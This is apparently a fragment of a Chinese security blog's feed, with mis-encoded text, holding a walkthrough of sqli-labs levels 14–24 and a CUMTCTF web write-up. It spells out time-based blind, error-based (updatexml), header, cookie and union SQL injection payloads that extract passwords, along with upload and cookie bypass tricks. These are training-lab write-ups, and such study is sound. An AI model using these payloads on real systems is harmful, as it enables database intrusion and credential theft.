alt=""><br>é€šè¿‡æŠ¥é”™æ³¨å…¥è·å¾—æ•°æ®åº“ï¼Œè¡¨åï¼Œåˆ—åï¼Œåˆ—ä¸­çš„ä¿¡æ¯ã€‚</p><h2 id="ç¬¬åå››å…³"><a href="#ç¬¬åå››å…³" class="headerlink" title="ç¬¬åå››å…³"></a>ç¬¬åå››å…³</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggqihzcffgj30vx0k4n31.jpg" alt=""><br>ç»è¿‡æµ‹è¯•å‘ç°æœ¬å…³æ˜¯ä»¥åŒå¼•å·å­—ç¬¦çš„é—­åˆæ–¹å¼ï¼Œä½†æ˜¯æœ¬é¢˜æ²¡æœ‰æŠ¥é”™è¯­å¥ï¼Œæ‰€ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨çš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggqikgn850j30yh0k7q8a.jpg" alt=""><br>ä½¿ç”¨adminâ€ and if(length(database())=8,sleep(5),0)#çŒœæµ‹å‡ºæ•°æ®åº“çš„é•¿åº¦ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggqinh4n6uj30y80iqn2i.jpg" alt=""><br>ä½¿ç”¨adminâ€ and if(left(database(),8)=â€securityâ€,sleep(5),0)#çŒœæµ‹å‡ºæ•°æ®åº“åä¸ºsecurityã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggqioz96y6j31090m2wjz.jpg" alt=""><br>ä½¿ç”¨adminâ€ and if(left((select table_name from information_schema.tables where table_schema=â€securityâ€ limit 3,1),5)=â€usersâ€,sleep(5),0)#çŒœå‡ºè¡¨åä¸ºusersã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggqiq7ayskj31050m1gr2.jpg" alt=""><br>ä½¿ç”¨adminâ€ and if(left((select column_name from information_schema.columns where table_name=â€usersâ€ limit 2,1),8)=â€passwordâ€,sleep(5),0)#çŒœå‡ºåˆ—åä¸ºpasswordã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggqir13y64j30yy0jste3.jpg" alt=""><br>ä½¿ç”¨adminâ€ and if(left((select password from users limit 0,1),4)=â€dumbâ€,sleep(5),0)#çŒœå‡ºpasswordä¸­çš„ä¿¡æ¯ã€‚</p><h2 id="ç¬¬åäº”å…³"><a href="#ç¬¬åäº”å…³" class="headerlink" title="ç¬¬åäº”å…³"></a>ç¬¬åäº”å…³</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggqiw351ffj30yq0mfgrm.jpg" alt=""><br>æµ‹è¯•å‘ç°æ˜¯å•å¼•å·å­—ç¬¦çš„é—­åˆæ–¹å¼ï¼Œä¸€æ ·çš„æ²¡æœ‰æŠ¥é”™è¯­å¥å’Œæ˜¾ç¤ºä½ï¼Œå‚è€ƒç¬¬åå››å…³ä½¿ç”¨æ—¶é—´ç›²æ³¨è¿›è¡Œæ³¨å…¥ã€‚</p><h2 id="ç¬¬åå…­å…³"><a href="#ç¬¬åå…­å…³" class="headerlink" title="ç¬¬åå…­å…³"></a>ç¬¬åå…­å…³</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggqj1ndrwhj30x80ledls.jpg" alt=""><br>æœ¬å…³é‡‡ç”¨(â€œâ€)çš„é—­åˆæ–¹å¼ï¼Œæ— æ˜¾ç¤ºä½å’ŒæŠ¥é”™è¯­å¥ï¼Œå‚è€ƒåå››å…³é‡‡ç”¨æ—¶é—´ç›²æ³¨è¿›è¡Œæ³¨å…¥ã€‚</p><h2 id="ç¬¬åä¸ƒå…³"><a href="#ç¬¬åä¸ƒå…³" class="headerlink" title="ç¬¬åä¸ƒå…³"></a>ç¬¬åä¸ƒå…³</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggqmbpk51dj30y10m7qch.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggrr4t5t7lj30hd04nwel.jpg" alt=""><br>ç”¨æˆ·åä½¿ç”¨check_input()å¯¹ username è¿›è¡Œå„ç§è½¬ä¹‰çš„å¤„ç†,æ‰€ä»¥æœ¬å…³ä¸èƒ½å¯¹ç”¨æˆ·åè¿›è¡Œæ³¨å…¥ï¼Œä½†èƒ½å¯¹å¯†ç è¿›è¡Œæ³¨å…¥ï¼Œæ²¡æœ‰æ˜¾ç¤ºä½ä½†æ˜¯æœ‰é”™è¯¯ä¿¡æ¯ï¼Œæ‰€ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚<br>å‚è€ƒï¼š<a href="https://blog.csdn.net/Kevinhanser/article/details/81519279" target="_blank" rel="noopener" title="æŠ¥é”™å‹æ›´æ–°è¯­å¥ç›²æ³¨">https://blog.csdn.net/Kevinhanser/article/details/81519279</a><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggqmrg4ldfj310e0m7ajr.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggqmro0lchj310b0mkn6u.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggqms4sb5cj30ym0m912d.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggqmscefgwj30xc0mg7ds.jpg" alt=""><br>ä½¿ç”¨æŠ¥é”™æ³¨å…¥ä¾æ¬¡è·å¾—æ•°æ®åº“ï¼Œè¡¨åï¼Œåˆ—åï¼Œä»¥åŠåˆ—åä¸­çš„ä¿¡æ¯ã€‚</p><h2 id="ç¬¬åå…«å…³"><a href="#ç¬¬åå…«å…³" class="headerlink" title="ç¬¬åå…«å…³"></a>ç¬¬åå…«å…³</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggrq8mmz13j30v20hh0t7.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggrr7ie0hdj30hv047glp.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggrrgo3ekpj3105023aa5.jpg" alt=""><br>æ‰“å¼€å‘ç°æ˜¾ç¤ºäº†IPåœ°å€ï¼Œç™¾åº¦åå‘ç°ï¼Œæœ¬å…³æ˜¯headerå¤´æ³¨å…¥ï¼Œä¿®æ”¹httpå¤´çš„User-Agentå‚æ•°ã€‚<br>æŸ¥çœ‹æºç å‘ç°ã€‚æœ¬å…³å¯¹ç”¨æˆ·åå’Œå¯†ç éƒ½è¿›è¡Œäº†å„ç§è½¬ä¹‰çš„å¤„ç†ï¼Œæ‰€ä»¥éƒ½ä¸èƒ½æ³¨å…¥ã€‚å¹¶ä¸”å‘ç°äº†insertè¯­å¥ï¼Œä»–æŠŠuser-agentæ’å…¥åˆ°äº†æ•°æ®åº“ã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggrqf7jw0ij30yi0jg0yy.jpg" alt=""><br>éœ€è¦ç™»å½•æˆåŠŸåæ‰èƒ½æ³¨å…¥ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggrrqh66ndj31320oz42d.jpg" alt=""><br>ä¿®æ”¹user-agentçš„å€¼ä½¿å…¶ç¬¦åˆæ•´ä¸ªinsert intoçš„è¯­å¥ï¼Œé—­åˆååº”è¯¥ä¸ºindert into table values(â€˜1â€™,1,1)#â€™,â€™IPâ€™,â€™Usernameâ€™),æˆåŠŸç»•è¿‡ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggrrx7cba3j311i0okq6z.jpg" alt=""><br>æ¥ç€ä½¿ç”¨æŠ¥é”™æ³¨å…¥è·å¾—æ•°æ®åº“åsecurityã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggrrze5svpj30w30omtci.jpg" alt=""><br>ç»§ç»­è·å¾—è¡¨åusersã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggrs0xla4bj30ws0oitci.jpg" alt=""><br>è·å¾—åˆ—åpasswordã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggrs2mpwgmj312b0phtcx.jpg" alt=""><br>è·å¾—åˆ—åä¸­çš„ä¿¡æ¯ã€‚<br>å‚è€ƒï¼š<a href="https://www.cnblogs.com/AmoBlogs/p/8677729.html" target="_blank" rel="noopener">https://www.cnblogs.com/AmoBlogs/p/8677729.html</a></p><h2 id="ç¬¬åä¹å…³"><a href="#ç¬¬åä¹å…³" class="headerlink" title="ç¬¬åä¹å…³"></a>ç¬¬åä¹å…³</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggrwtl0g35j30yr0kcjxi.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggrwt1gezaj30vq02u74f.jpg" alt=""><br>å’Œç¬¬åå…«å…³ç±»ä¼¼ï¼Œåªä¸è¿‡æœ¬å…³æ˜¯å°†refereræ’å…¥æ•°æ®åº“ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggrwvpman5j31100q6tf4.jpg" alt=""><br>ä¿®æ”¹refererçš„å€¼ä½¿å…¶ç¬¦åˆæ•´ä¸ªinsert intoçš„è¯­å¥ï¼Œé—­åˆååº”è¯¥ä¸ºindert into table values(â€˜1â€™,1)#â€™,â€™IPâ€™),æˆåŠŸç»•è¿‡ã€‚<br>ç„¶åå‚è€ƒç¬¬åå…«è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚</p><h2 id="ç¬¬äºŒåå…³"><a href="#ç¬¬äºŒåå…³" class="headerlink" title="ç¬¬äºŒåå…³"></a>ç¬¬äºŒåå…³</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggrx712wtuj313a0gun52.jpg" alt=""><br>é¢˜ç›®ç»™äº†cookie:uname=adminæ‰€ä»¥è¿™é¢˜åº”è¯¥æ˜¯cookieæ³¨å…¥ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggrxh6punyj31g50nun6j.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggrxjzrua5j31h20osdpt.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggrxlylr13j31gl0o9tik.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggrxmxeq80j31d90o0dp8.jpg" alt=""><br>ç„¶åå‚è€ƒç¬¬åå…«å…³è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚</p><h2 id="ç¬¬äºŒåä¸€å…³"><a href="#ç¬¬äºŒåä¸€å…³" class="headerlink" title="ç¬¬äºŒåä¸€å…³"></a>ç¬¬äºŒåä¸€å…³</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggry1sm3eoj30ne05kgly.jpg" alt=""><br>æŸ¥çœ‹æºä»£ç å‘ç°æœ¬å…³æ˜¯å°†cookieçš„å†…å®¹base64è§£å¯†åå†è¿è¡Œï¼Œè€Œä¸”cookieæ˜¯ä»¥(â€˜â€™)çš„å­—ç¬¦é—­åˆæ–¹å¼ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggry9ipe8ij31fo0q97cw.jpg" alt=""><br>æ„é€ payloadï¼šadminâ€™) and updatexml(1,concat(0x7e,database(),0x7e),1)#base64åŠ å¯†åé€šè¿‡æŠ¥é”™æ³¨å…¥è·å¾—æ•°æ®åº“åã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggryc861tcj31gn0opahl.jpg" alt=""><br>æ„é€ payload:adminâ€™) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=â€securityâ€ limit 3,1),0x7e),1)#base64åŠ å¯†åè·å¾—è¡¨åã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggryei7lxvj31gp0ojdnd.jpg" alt=""><br>æ„é€ payload:adminâ€™) and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=â€usersâ€ limit 2,1),0x7e),1)#base64åŠ å¯†åè·å¾—åˆ—åã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggryh69yz9j31eh0og7bi.jpg" alt=""><br>æ„é€ payload:adminâ€™) and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#base64åŠ å¯†åè·å¾—å¯†ç ã€‚</p><h2 id="ç¬¬äºŒåäºŒå…³"><a href="#ç¬¬äºŒåäºŒå…³" class="headerlink" title="ç¬¬äºŒåäºŒå…³"></a>ç¬¬äºŒåäºŒå…³</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggryjrxus4j30l503ugls.jpg" alt=""><br>é€šè¿‡æŸ¥çœ‹æºä»£ç å‘ç°cookieæ˜¯ä»¥åŒå¼•å·å­—ç¬¦çš„é—­åˆæ–¹å¼ï¼Œå’Œç¬¬äºŒåä¸€å…³ä¸€æ ·æ˜¯base64è§£å¯†åå†æ‰§ã€‚æ‰€ä»¥å‚è€ƒç¬¬äºŒåä¸€å…³è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œæ„é€ çš„payloadä¸ºadminâ€ and updatexml(1,payload,1)ã€‚</p><h2 id="ç¬¬äºŒåä¸‰å…³"><a href="#ç¬¬äºŒåä¸‰å…³" class="headerlink" title="ç¬¬äºŒåä¸‰å…³"></a>ç¬¬äºŒåä¸‰å…³</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggryuxtx84j30j80c0wfa.jpg" alt=""><br>æŸ¥çœ‹æºä»£ç å‘ç°æ³¨é‡Šç¬¦#å’Œâ€“è¢«è¿‡æ»¤æ‰äº†ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggrz7cg9nuj30id04jt8s.jpg" alt=""><br>å‘ç°sqlè¯­å¥ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggrz7qziu3j31bk0l77bv.jpg" alt=""><br>ä¸èƒ½ä½¿ç”¨æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥æ„é€ payload:?id=999â€™ union select 1,2,3 â€˜å°†å•å¼•å·é—­åˆã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggrzchcc8qj31330ly454.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggrzcol0f8j31490l0wlm.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggrzcu2srbj312y0lzagv.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggrzd2llzvj315g0lsdn5.jpg" alt=""><br>æ¥ç€ä½¿ç”¨è”åˆæ³¨å…¥è¿›è¡Œæ³¨å…¥ã€‚</p><h2 id="ç¬¬äºŒåå››å…³"><a href="#ç¬¬äºŒåå››å…³" class="headerlink" title="ç¬¬äºŒåå››å…³"></a>ç¬¬äºŒåå››å…³</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQLæ³¨å…¥ä¹‹sqli-labså­¦ä¹ &quot;&gt;&lt;a href=&quot;#SQLæ³¨å…¥ä¹‹sqli-labså­¦ä¹ &quot; class=&quot;headerlink&quot; title=&quot;SQLæ³¨å…¥ä¹‹sqli-labså­¦ä¹ &quot;&gt;&lt;/a&gt;SQLæ³¨å…¥ä¹‹sqli-labså­¦ä¹ &lt;/h1&gt;&lt;h2 id=&quot;ç¬¬ä¸€å…³&quot;&gt;
      
    
    </summary>
    
    
      <category term="web" scheme="https://devildragons.github.io/categories/web/"/>
    
    
      <category term="sqlæ³¨å…¥" scheme="https://devildragons.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTFé¢˜è§£</title>
    <link href="https://devildragons.github.io/2020/06/09/CUMTCTF-web/"/>
    <id>https://devildragons.github.io/2020/06/09/CUMTCTF-web/</id>
    <published>2020-06-08T16:00:00.000Z</published>
    <updated>2020-09-20T02:42:07.157Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h1 id="å…¥é—¨é¢˜ï¼š"><a href="#å…¥é—¨é¢˜ï¼š" class="headerlink" title="å…¥é—¨é¢˜ï¼š"></a>å…¥é—¨é¢˜ï¼š</h1><h2 id="1ã€array"><a href="#1ã€array" class="headerlink" title="1ã€array"></a>1ã€array</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6e40b1lj30na06x749.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6edjs8xj31720pdjt9.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6erm1u8j30tc0jd0u1.jpg" alt=""></p><p>ä»è¡¨ä¸­å¯çŸ¥é“æ”¹=è¯¥æ­£åˆ™è¡¨è¾¾å¼^[1-9]+$è¡¨ç¤ºè¦åŒ¹é…ä¸€æ¬¡æˆ–å¤šæ¬¡1åˆ°9çš„æ•°å­—<br>ä»ä»£ç å¯ä»¥çŸ¥é“éœ€è¦æŠŠX-Forwarded-Forè®¾ç½®ä¸º127.0.0.1,æ‰å¯ä»¥å¾€ä¸‹æ‰§è¡Œ</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6fb3l2hj30nu05ydg3.jpg" alt=""><br>å¦‚æœä¼ å…¥çš„elementæ˜¯æ•°ç»„åˆ™è¿”å›NULLï¼Œè€ŒNULLå’ŒFALSEç±»å‹ä¸ä¸€æ ·æ‰€ä»¥å¯ä»¥ç»•è¿‡ï¼Œ<br>passæ˜¯æ•°ç»„çš„è¯ä¹Ÿè¿”å›NULLï¼Œè€Œpass1ä¸ä¸ºç©ºï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡strcmpå‡½æ•°</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6g5t6yxj30cc018we9.jpg" alt=""></p><p>äºæ˜¯ä¼ elementå’Œpassçš„å‚æ•°ä¸ºæ•°ç»„å½¢å¼ç„¶åæŠ“åŒ…</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6go6zcuj30k0074wf9.jpg" alt=""><br>æ·»åŠ X-Forwarded-For:127.0.0.1å°†ipä¿®æ”¹ä¸º127.0.0.1ä»è€Œè·å¾—flag.</p><h2 id="2ã€easy-file-get-contents"><a href="#2ã€easy-file-get-contents" class="headerlink" title="2ã€easy_file_get_contents"></a>2ã€easy_file_get_contents</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6i7lzpqj30on06hjrh.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6igo5soj30lb0engm4.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6indj7yj30tc0agq3k.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6j68cnuj30sv06674g.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6jclt7mj30dr072jrf.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6jq5lbpj30fs01u0sj.jpg" alt=""></p><p>æ‰€ä»¥æ„é€ payloadï¼Œpath=flag.phpå°†flag.phpä¸­çš„å†…å®¹å¤åˆ¶åˆ°pathä¸­ï¼Œ</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6kjuwhgj30n101b0sm.jpg" alt=""><br>æ‰€ä»¥æ„é€ userè¿™æ®µpayloadæ¥æ»¡è¶³ifè¯­å¥<br>ä»è€Œè·å¾—flag<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6l5jskoj30d201gdfn.jpg" alt=""></p><h2 id="3ã€chang-script"><a href="#3ã€chang-script" class="headerlink" title="3ã€chang_script"></a>3ã€chang_script</h2><p><strong>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6n97wnjj30xo0b074m.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6nhgkfyj30if05x74h.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6nw7z5rj30o30a4q3a.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6o60gmjj30fv0ihjrn.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6oe11wmj30dm061jrg.jpg" alt=""><br>Eval()ä¼šå°†å‚æ•°å­—ç¬¦ä¸²å½“ä½œå‘½ä»¤è¯­å¥æ‰§è¡Œï¼Œæ•…åˆ©ç”¨ç±»ä¼¼å•å¼•å·é—­åˆçš„åŸç†å¯ä»¥æ³¨å…¥è¯­å¥ã€‚æ„é€ payloadå¦‚ä¸‹</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6ozlzcqj30ee01g3yb.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6p7cux1j311n029glm.jpg" alt=""><br>ç„¶åè·å¾—urlç¼–ç çš„flagï¼Œè¿›è¡Œurlè§£ç å³å¯è·å¾—æœ€ç»ˆflag<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6ptxiz8j30lt087q2w.jpg" alt=""></p><h1 id="æŒ‘æˆ˜é¢˜ï¼š"><a href="#æŒ‘æˆ˜é¢˜ï¼š" class="headerlink" title="æŒ‘æˆ˜é¢˜ï¼š"></a>æŒ‘æˆ˜é¢˜ï¼š</h1><h2 id="1ã€æºä»£ç "><a href="#1ã€æºä»£ç " class="headerlink" title="1ã€æºä»£ç "></a>1ã€æºä»£ç </h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6r4urq1j30jc0dngoh.jpg" alt=""><br>ç”±é¢˜ç›®çŸ¥é“éœ€è¦æŸ¥çœ‹æºä»£ç </p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6rir51qj30g105zweh.jpg" alt=""><br>å»æ‰å…¶ä¸­çš„æ­Œè¯è·å¾—flag</p><h2 id="2ã€colorSnake"><a href="#2ã€colorSnake" class="headerlink" title="2ã€colorSnake"></a>2ã€colorSnake</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6t6whkvj30wl09wmxd.jpg" alt=""><br>é æ‰‹ç©è·å¾—flagæ˜¯ä¸å¯èƒ½çš„</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6tjvxwuj30i904pmx8.jpg" alt=""><br>çœ‹æºä»£ç å‘ç°jsè„šæœ¬</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6tyd58tj30iz0bqwf5.jpg" alt=""><br>æŸ¥çœ‹è„šæœ¬å‘ç°å¾—åˆ†çš„phpï¼Œè¿™é‡Œé¢æœ‰ä¸ªxhrï¼Œä»‹ç»ä¸€ä¸‹xhrï¼Œxhrå«XMLHttpRequest ï¼ŒXMLHttpRequest å¯¹è±¡æä¾›äº†å¯¹ HTTP åè®®çš„å®Œå…¨çš„è®¿é—®ï¼ŒåŒ…æ‹¬åšå‡º POST å’Œ HEAD è¯·æ±‚ä»¥åŠæ™®é€šçš„ GET è¯·æ±‚çš„èƒ½åŠ›ã€‚XMLHttpRequest å¯ä»¥åŒæ­¥æˆ–å¼‚æ­¥åœ°è¿”å› Web æœåŠ¡å™¨çš„å“åº”ï¼Œå¹¶ä¸”èƒ½å¤Ÿä»¥æ–‡æœ¬æˆ–è€…ä¸€ä¸ª DOM æ–‡æ¡£çš„å½¢å¼è¿”å›å†…å®¹ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6un0n8yj30ov06y3yt.jpg" alt=""><br>è®¿é—®è¯¥ç•Œé¢</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6uzd4ldj30ea0e2dg5.jpg" alt=""><br>å‘ç°æœ‰jsonæ ¼å¼çš„ä¸œè¥¿ï¼ŒæŠŠé‡Œé¢çš„msgéƒ¨åˆ†çš„å†…å®¹unicodeè§£ç å¾—åˆ°ä¸€å¥è¯ï¼Œ<br>å¯ä»¥çŒœåˆ°åº”è¯¥æ˜¯ç”¨è¿™ä¸ªå»è®¿é—®é¡µé¢å»å¢åŠ å¾—åˆ†ï¼Œæ¯åˆ·æ–°ä¸€ä¸‹è¿™ä¸ªé¡µé¢å‘ç°scoreåŠ ä¸€äº†ï¼Œä½†æ˜¯åˆ·æ–°çš„å¤ªå¿«åˆä¼šé‡æ–°ç½®0</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6vipcrgj30kk05l0sr.jpg" alt=""><br>æ‰€ä»¥å¯ä»¥è§„å¾‹æ€§çš„åœä¸€ç§’åˆ·æ–°ä¸€ä¸‹ï¼Œä¹Ÿå¯ä»¥å†™ä¸ªè„šæœ¬ä»è€Œè·å¾—flag.</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6w235bsj30lg07e0t2.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6we5utlj30bd04pdfr.jpg" alt=""></p><p>è·å¾—flag</p><h2 id="3ã€å¤‡ä»½"><a href="#3ã€å¤‡ä»½" class="headerlink" title="3ã€å¤‡ä»½"></a>3ã€å¤‡ä»½</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6x92u4vj30o007nglz.jpg" alt=""><br>é¢˜ç›®æœ‰å¾ˆå¤šå¤‡ä»½è¦ä»ä¸­æ‰¾åˆ°flagå°±å†™ä¸ªè„šæœ¬ï¼ŒæŠŠæœ‰flagçš„å¤‡ä»½æ–‡ä»¶æ˜¾ç¤ºå‡ºæ¥</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6xne530j30ju06674e.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6xv9ylbj308003hq2r.jpg" alt=""></p><p>åœ¨ç¬¬998ä¸ªå¤‡ä»½æ–‡ä»¶é‡Œè·å¾—flag.</p><h2 id="4ã€ä¸Šä¼ ä¸€ã€äºŒ"><a href="#4ã€ä¸Šä¼ ä¸€ã€äºŒ" class="headerlink" title="4ã€ä¸Šä¼ ä¸€ã€äºŒ"></a>4ã€ä¸Šä¼ ä¸€ã€äºŒ</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8d09hzjj30k50fpglq.jpg" alt=""><br>å‘ç°æ˜¯phpç½‘é¡µï¼Œä½†æ˜¯ä¸èƒ½ä¸Šä¼ phpæ–‡ä»¶åªèƒ½ä¸Šä¼ å›¾ç‰‡</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8fasjmwj30nt084mxb.jpg" alt=""></p><p>äºæ˜¯ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œç„¶åæŠ“åŒ…ä¿®æ”¹å›¾ç‰‡åç¼€ä¸ºphp<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8fwgbmqj30yp0ik772.jpg" alt=""></p><p>å¾—åˆ°flagå‘ç°è¿˜é€äº†ä¸€ä¸ªä¸Šä¼ äºŒçš„flagï¼Œäºæ˜¯ä¸¤é¢˜flagåˆ°æ‰‹<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8gcy9lqj30dc01m0sj.jpg" alt=""></p><p>ä¸Šä¼ äºŒéœ€è¦Content-Typeä¸ºimageæ‰èƒ½çœ‹åˆ°flag</p><h2 id="5ã€Cookie"><a href="#5ã€Cookie" class="headerlink" title="5ã€Cookie?"></a>5ã€Cookie?</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8pqpvbzj30gm05mglo.jpg" alt=""><br>å‘ç°è¦ç”¨ç®¡ç†å‘˜èº«ä»½ç™»å½•ï¼Œäºæ˜¯æŠ“åŒ…</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8qcmtcrj30dw06saaa.jpg" alt=""><br>å‘ç°useræ˜¯guestï¼Œäºæ˜¯ä¿®æ”¹userä¸ºadmin<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8u50pfej30gx07njrm.jpg" alt=""><br>å‘ç°ä¸€å¼ å›¾ç‰‡</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8uloz1sj307v09vgoh.jpg" alt=""></p><p>æ‰“å¼€æ²¡å‘ç°ä»€ä¹ˆ</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8viian3j30vr0f941w.jpg" alt=""><br>ç™¾åº¦è¯†å›¾ï¼Œæ‰€ä»¥è¿™é¢˜åº”è¯¥æ˜¯ç»´å‰å°¼äºšå¯†ç </p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8w02m18j30f909gmx7.jpg" alt=""><br>è§£å¯†è·å¾—flag</p><h2 id="6ã€is-hash-safe"><a href="#6ã€is-hash-safe" class="headerlink" title="6ã€is hash safe?"></a>6ã€is hash safe?</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8xq49cjj30ss07gt8u.jpg" alt=""><br>æ‰“å¼€å‘ç°åˆè¦æ˜¯ç®¡ç†å‘˜ï¼Œäºæ˜¯æŠ“åŒ…<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8y0uy2oj30qn0gdt9v.jpg" 